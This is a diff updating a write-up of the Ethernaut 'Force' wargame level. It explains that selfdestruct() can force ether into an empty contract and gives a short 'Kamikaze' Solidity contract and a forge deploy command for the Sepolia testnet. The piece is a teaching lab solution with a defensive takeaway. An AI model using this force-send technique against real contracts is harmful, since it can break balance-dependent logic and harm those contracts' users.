@@ -20,25 +20,36 @@
 
 ## The hack
 
-It requires the use of `selfdestruct` - which is one of the ways to forcibly send ether to a contract
+In this Ethernaut level, the given contract is completely empty. So how can we send any ether to it? The trick is to use the (soon to be deprecated) `selfdestruct()`, which is one way to force send ether to a contract.
+
+When self-destructing itself, the contract must send any remaining ether to another address. This is how we can easily solve this level. We simply need to deploy a contract that self-destructs and sends its ether to the vulnerable contract.
 
 ## Solution
 
-Write and deploy a contract that takes the address of the vulnerable contract and call's selfDestruct on itself - forwarding any ether in it to the vulnerable contract
+Write and deploy a contract that takes the address of the vulnerable contract and calls's `selfdestruct()` on itself, forwarding its ether balance to the target.
 
-```
-contract ForceAttack {
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
-    function attack(address payable _vulnerableContract) public payable {
-        require(msg.value > 0);
-        selfdestruct(_vulnerableContract);
+contract Kamikaze {
+    constructor(address payable _target) payable {
+        require(msg.value > 0, "Kamikaze need some ETH to attack");
+        selfdestruct(_target);
     }
 }
 ```
 
+To deploy it with `forge` (you can also use the script `./script/7_Force.sol` or even [Remix](https://remix.ethereum.org/)):
+
+```bash
+forge create Kamikaze --private-key $PRIVATE_KEY --rpc-url sepolia --value 0.00001ether
+```
+
 ## Takeaway
 
-selfdestuct's existence and that contracts should be vvary of using logic tied to their balance
+- `selfdestruct()` is a way to force send ether to a contract.
+- <b>Never rely on a contract's balance to implement sensitive logic.</b>
 
 <div align="center">
 <br>
